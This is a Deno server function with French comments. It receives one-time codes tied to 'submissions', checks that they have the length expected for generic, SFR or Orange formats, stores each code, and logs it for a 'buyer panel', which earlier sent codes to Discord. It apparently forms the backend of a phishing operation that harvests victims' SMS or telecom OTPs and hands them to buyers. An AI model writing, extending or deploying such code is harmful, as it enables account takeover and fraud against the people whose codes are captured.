import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

Deno.serve(async (req) => {
  const base44 = createClientFromRequest(req);
  const { code, submissionId } = await req.json();

  if (!submissionId) {
    return Response.json({ error: "submissionId requis" }, { status: 400 });
  }

  // Récupère la demande en base
  let sub = null;
  try {
    const records = await base44.asServiceRole.entities.Submission.filter({ id: submissionId }, "-created_date", 1);
    sub = records[0] || null;
  } catch (e) {
    console.error("fetch submission failed:", e.message);
  }

  // Anti-spam: ne traiter que les demandes réellement en attente de code.
  // Empêche les appels directs (bots) de soumettre des codes sans une demande valide.
  const READY_STATES = ["code_ready", "code6_ready", "code6sfr_ready", "code6orange_ready"];
  if (!sub || !READY_STATES.includes(sub.status)) {
    return Response.json({ error: "Demande non éligible" }, { status: 400 });
  }

  // Valider le format du code selon le statut attendu
  const expectedLength = sub.status === "code_ready" ? 4 : 6;
  const codeStr = String(code || "");
  if (!/^\d+$/.test(codeStr) || codeStr.length !== expectedLength) {
    return Response.json({ error: "Format de code invalide" }, { status: 400 });
  }

  // Le code saisi est stocké sur la demande et affiché dans le panel acheteur
  // (carte "OTP submitted"). Aucun envoi vers Discord. L'assignation au buyer
  // est conservée. Le statut précédent (format de code demandé) est mémorisé
  // pour pouvoir autoriser un renvoi si l'OTP est invalide.
  await base44.asServiceRole.entities.Submission.update(submissionId, {
    status: "otp_submitted",
    entered_code: codeStr,
    last_ready_status: sub.status,
  }).catch(() => {});

  // Journalise la saisie du code pour l'historique consulté dans le panel acheteur.
  await base44.asServiceRole.entities.ActionLog.create({
    submission_id: submissionId,
    action: "code_entered",
    details: { code: codeStr, format: sub.status },
    timestamp: new Date().toISOString(),
  }).catch(() => {});

  return Response.json({ ok: true });
});